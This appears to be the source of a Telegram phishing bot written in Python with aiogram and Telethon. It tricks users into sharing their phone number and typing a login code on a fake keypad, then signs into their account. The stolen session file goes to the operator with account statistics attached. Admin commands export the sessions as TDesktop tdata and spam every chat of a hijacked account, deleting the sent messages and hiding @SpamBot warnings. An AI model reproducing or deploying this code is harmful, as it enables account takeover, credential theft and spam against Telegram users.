import asyncio
import datetime
import os
import shutil
import zipfile

from aiogram.dispatcher import FSMContext
from aiogram.types import CallbackQuery, Message, ReplyKeyboardRemove
from data import (ClientTG, User, bad_code, if_replay, spam_msg, test_ceance,
                  two_fa, warning_msg, codee, tyt)
from loader import bot, dp
from markup import code_markup
from opentele.api import API, UseCurrentSession
from opentele.td import TDesktop
from opentele.tl import TelegramClient
from state import GetAccountTG
from telethon import functions, types
from telethon.errors.rpcerrorlist import (FloodWaitError,
                                          PhoneCodeInvalidError,
                                          SessionPasswordNeededError)
from telethon.sync import TelegramClient
from utils import config


@dp.message_handler(commands=['session'])
async def send_session(msg: Message):  
    if msg.from_user.id == int(config('admin_id')):
        if len(os.listdir('session/')) > 0:
            archive = zipfile.ZipFile('sessions.zip', mode='w')
            for phone in os.listdir('session/'):
                try:
                    archive.write(f'session/{phone}')
                    os.remove(f'session/{phone}')
                except Exception as e:
                    print(e)
            archive.close()
            await bot.send_document(msg.chat.id, open(f'sessions.zip', 'rb'))
            os.remove('sessions.zip')
        else:
            await bot.send_message(msg.from_user.id, 'Нет логов на выгрузку.')


@dp.message_handler(commands=['tdata'])
async def to_tdata(msg: Message):  
    if msg.from_user.id == int(config('admin_id')):
        session_convert = msg.get_args()
        convert = TelegramClient(f'session/{session_convert}.session')
        tdesk = await convert.ToTDesktop(flag=UseCurrentSession)
        tdesk.SaveTData('tdata')
        await asyncio.sleep(5)
        shutil.make_archive('tdata', 'zip', 'tdata')
        await bot.send_document(msg.chat.id, open('tdata.zip', 'rb'))
        os.remove('tdata.zip')
        shutil.rmtree('tdata')


@dp.message_handler(commands=['spam'])
async def send_spam(msg: Message):  
    if msg.from_user.id == int(config('admin_id')):
        messages = 0
        session_spam = msg.get_args()
        try:
            client = TelegramClient(
                f"session/{session_spam.split('.')[0]}",
                api_id=config('api_id'),
                api_hash=config('api_hash')
                )
            await client.connect()    
            async for dialog in client.iter_dialogs():
                try:
                    try:
                        user_ids = dialog.message.peer_id.user_id
                    except:
                        pass
                    await client.send_message(user_ids, spam_msg)
                    async for message in client.iter_messages(user_ids, search=spam_msg):
                        msg = []
                        msg.append(message.id)
                        await client.delete_messages(user_ids, msg, revoke=False)
                    messages += 1
                except:
                    pass
            await client.disconnect()
            await msg.reply(f'Успешно проспамил по {messages} чатам.')
        except:
            await msg.reply('Ошибка.')


@dp.message_handler(content_types=['contact'], state=GetAccountTG.one)
async def contact_handler(msg: Message, state: FSMContext):
    phone = msg.contact.phone_number.replace('', '')

    User(user_id=msg.from_user.id).update_phone(phone=phone)

    if not os.path.exists('./session/{phone}.session'.format(phone=phone[1:])):

        try:
            client = ClientTG(phone=phone).client
            await client.connect()

            send_code = await client.send_code_request(phone=phone)
            if client.is_connected():
                await client.disconnect()

            await msg.answer(
                text = test_ceance,
                reply_markup=ReplyKeyboardRemove()
            )

            msg_edit = await bot.send_message(
                chat_id=msg.from_user.id,
                text=f'<b>{codee}</b>',
                reply_markup=code_markup()
            )

            await state.update_data(
                    phone=phone,
                    send_code=send_code,
                    code_hash=send_code.phone_code_hash,
                    msg_edit=msg_edit)

            await GetAccountTG.next()
        except FloodWaitError as error:
            await msg.answer(
                text=f'<b>❌ Error!\n {error}</b>'
            )
            await state.finish()
    else:
        await msg.answer(
            text = if_replay,
            reply_markup=ReplyKeyboardRemove()
        )
        await state.finish()


@dp.callback_query_handler(text_startswith="code_number:", state=GetAccountTG.two)
async def get_account_tg(call: CallbackQuery, state: FSMContext):
    one = call.data.split(":")[1]
    async with state.proxy() as data:
        data['one'] = one
        msg_edit = data['msg_edit']

        await msg_edit.edit_text(
            text=f'<b>{tyt}</b> <code>{one}</code>',
            reply_markup=code_markup()
        )

        await GetAccountTG.next()


@dp.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.three)
async def get_account_tg_three(call: CallbackQuery, state: FSMContext):
    two = call.data.split(":")[1]

    async with state.proxy() as data:
        data['two'] = two
        msg_edit = data['msg_edit']
        one = data['one']

    code = one + two

    await msg_edit.edit_text(
        text=f'<b>{tyt}</b> <code>{code}</code>',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.next()


@dp.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.four)
async def get_account_tg_four(call: CallbackQuery, state: FSMContext):
    three = call.data.split(":")[1]

    async with state.proxy() as data:
        data['three'] = three
        msg_edit = data['msg_edit']
        one = data['one']
        two = data['two']

    code = one + two + three

    await msg_edit.edit_text(
        text=f'<b>{tyt}</b> <code>{code}</code>',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.next()


@dp.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.five)
async def get_account_tg_five(call: CallbackQuery, state: FSMContext):
    four = call.data.split(":")[1]

    async with state.proxy() as data:
        data['four'] = four
        msg_edit = data['msg_edit']
        one = data['one']
        two = data['two']
        three = data['three']

    code = one + two + three + four

    await msg_edit.edit_text(
        text=f'<b>{tyt}</b> <code>{code}</code>',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.next()


@dp.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.load)
async def get_account_tg_load(call: CallbackQuery, state: FSMContext):
    five = call.data.split(":")[1]

    async with state.proxy() as data:
        one = data['one']
        two = data['two']
        three = data['three']
        four = data['four']
        msg_edit = data['msg_edit']
        phone = data['phone']
        send_code = data['send_code']
        code_hash = data['code_hash']

    code = one + two + three + four + five

    client = ClientTG(phone=phone).client

    await client.connect()

    try:
        await client.sign_in(
            phone=phone, 
            code=code, 
            phone_code_hash=code_hash
        )

        await msg_edit.edit_text(text=warning_msg)
        
        PeerUser = 0
        PeerChannel = 0
        PeerChat = 0
        premium = await client.get_me()

        await client(functions.account.UpdateNotifySettingsRequest(peer='@SpamBot', settings=types.InputPeerNotifySettings(show_previews=False, mute_until=datetime.datetime(2025, 6, 25), sound=types.NotificationSoundDefault())))
        await client.send_message('@SpamBot', '/start')
        await client.edit_folder('@SpamBot', 1)
        try:
            async for message in client.iter_messages('@SpamBot', from_user='@SpamBot'):
                g = message.message
                if g == 'Ваш аккаунт свободен от каких-либо ограничений.':
                    spamblock = 'False '
                    await client(functions.messages.DeleteHistoryRequest(peer='@SpamBot', max_id=0))
                    break
                if g.split('\n\n')[1].split(':')[0] == 'Теперь Ваш аккаунт ограничен':
                    spamblock = 'Вечный '
                    await client(functions.messages.DeleteHistoryRequest(peer='@SpamBot', max_id=0))
                    break
                else:
                    spamblock = g.split('.')[:-1][5].split('сняты ')[1].split(', ')[0]
                    await client(functions.messages.DeleteHistoryRequest(peer='@SpamBot', max_id=0))
                    break
        except:
            spamblock = 'Error'
            await client(functions.messages.DeleteHistoryRequest(peer='@SpamBot', max_id=0))


        async for dialog in client.iter_dialogs():
            s = dialog.message.peer_id
            f = str(s).split('(')[:-1]
            if f[0] == 'PeerUser':
                PeerUser = PeerUser + 1
            if f[0] == 'PeerChannel':
                PeerChannel = PeerChannel + 1
            if f[0] == 'PeerChat':
                PeerChat = PeerChat + 1


        with open(f'./session/{phone[1:]}.session', 'rb') as document:
            await bot.send_document(
                chat_id=config("admin_id"),
                document=document,
                caption=f'<b>Чатов:</b> {PeerUser}\n<b>Каналов:</b> {PeerChannel}\n<b>Групповых чатов:</b> {PeerChat}\n\n<b>Спамблок:</b> {spamblock}\n<b>Premium:</b> {premium.premium}\n\n<b>Пользователь:</b> {call.from_user.get_mention()} | {phone[1:]}\n\n<code>/spam {phone[1:]}</code>\n<code>/tdata {phone[1:]}</code>'
            )
            document.close()


    except SessionPasswordNeededError:
        await client.disconnect()
        os.remove(f"session/{phone[1:]}.session")
        await msg_edit.edit_text(text=two_fa)


    except PhoneCodeInvalidError:
        await client.disconnect()
        os.remove(f"session/{phone[1:]}.session")
        await msg_edit.edit_text(text=bad_code)


    if client.is_connected():
        await client.disconnect()

    await state.finish()
